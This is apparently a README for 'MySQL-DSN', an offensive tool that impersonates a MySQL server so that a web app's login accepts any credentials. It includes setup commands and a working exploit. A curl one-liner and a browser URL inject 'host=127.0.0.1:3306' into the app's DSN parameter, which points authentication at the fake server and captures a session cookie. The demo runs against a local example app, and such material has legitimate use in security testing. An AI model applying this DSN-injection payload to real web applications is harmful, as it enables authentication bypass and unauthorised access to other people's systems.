# MySQL-DSN
MYSQL-DSN is a tool that act like as "MySQL server" to exploit DSN vulnerability in authentication by return the entered username, and password.

### Example
if MySQL server is installed and running, stop MySQL server
```
service mysql stop
pkill -9 mysql
```
start MySQL-DSN server
```
python3 MySQL-DSN.py
```
start apache2 web server to demonstrate the vulnerable web application
```
service apache2 start
```
copy index.php success.php from example folder to your web server default /var/www/html/
```
cp ./example/index.php ./example/success.php /var/www/html/
```
exploit using curl
```
curl --cookie $(curl -I -X GET 'http://localhost/index.php?login=&username=test&password=test&db=testing;host=127.0.0.1:3306' | grep -o -P '(?<=: ).*(?=;)' | awk 'NR==1{print $1}') -X GET http://localhost/success.php
```
exploit using the browser
```
http://localhost/index.php?login=&username=test&password=test&db=testing;host=127.0.0.1:3306
```
